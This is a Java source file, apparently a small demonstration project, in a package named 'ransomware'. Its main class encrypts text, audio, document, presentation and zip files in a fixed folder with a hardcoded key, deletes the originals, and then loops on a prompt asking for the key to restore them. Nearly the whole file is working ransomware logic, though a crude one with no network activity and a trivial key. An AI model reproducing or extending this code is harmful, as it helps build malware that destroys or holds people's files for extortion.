/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware;



import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.io.FilenameFilter;
import java.util.Scanner;
import java.util.List;
import java.nio.file.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;



public class Main {

    /**
     * @param args the command line arguments
     */

        public static String CodeKey="12345678";
        public static String basedir="/Users/Robot/Desktop/encrypt/"; // carefully give the base directory
        
        public static void main(String[] args) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
            
            FireUP();
            
            
          // Encrypt("hello.txt");
           
           while(true)
           Recover();
        }
        
        
        public static void FireUP() throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
           // System.out.println("FIRE UP working");
            File file= new File(basedir);
                           //  System.out.println(file);
            File[] files=file.listFiles(new FilenameFilter(){

                public boolean accept(File dir, String name){
                   
                    if(name.toLowerCase().endsWith(".txt") || name.toLowerCase().endsWith(".mp3") || name.toLowerCase().endsWith(".doc") || name.toLowerCase().endsWith(".zip")
                            || name.toLowerCase().endsWith(".docx") || name.toLowerCase().endsWith(".ppt")){
                        return true;
                    }
                    
                    else{
                        return false;
                    }
                }
                
            });
            for(File f:files){
                System.out.println(f.getName());
                
                Encrypt(basedir+f.getName());
            }
        }
        
        
    public static void Encrypt(String targetFilePath) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        File inputFile = new File(targetFilePath);
       
        File encryptedFile= new File(targetFilePath+".encrypt");
       // System.out.println(inputFile);
        
        
        
        try{
            CrypTool.encrypt(CodeKey,inputFile,encryptedFile);
            System.out.println(inputFile+" is encrypted now!");
            inputFile.delete();
        }
    
    catch(CryptoException ex){
    System.out.println(ex.getMessage());
    ex.printStackTrace();
}
    }
    
    public static void Decrypt(String targetFilePath) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        File inputFile = new File(targetFilePath);
        File decryptedFile= new File(targetFilePath+".decrypt");
        try{
            CrypTool.decrypt(CodeKey,inputFile,decryptedFile);
            System.out.println(inputFile+" is decrypted now!");
            
        }
    
    catch(CryptoException ex){
    System.out.println(ex.getMessage());
    ex.printStackTrace();
}
    }
public static void Recover() throws NoSuchAlgorithmException, IllegalBlockSizeException, IOException, FileNotFoundException, BadPaddingException, InvalidKeyException, NoSuchPaddingException{

        Scanner myObj=new Scanner(System.in);
        System.out.println("Enter Key to recover your files or to exit write 'exit': ");
        
        String code=myObj.nextLine();
       if("exit".equals(code)){
           System.exit(0);
       }
       else{
        if(code.equals(CodeKey)){
        
        System.out.println("Working......");
        File file=new File(basedir);
        System.out.println(file);
            File[] files=file.listFiles(new FilenameFilter(){

            
        @Override
        public boolean accept(File dir, String name){
        
            System.out.println(name);
        if(name.toLowerCase().endsWith(".encrypt")){
             
            return true;
            
           
        }
        else{
            
               return false;
        }
        
        }



});
for(File f:files){

    System.out.println(f.getName());
        Decrypt(basedir+f.getName());
        f.delete();

        
}
}
        else
    System.out.println("Wrong KEY!!!!");
}

        
}
}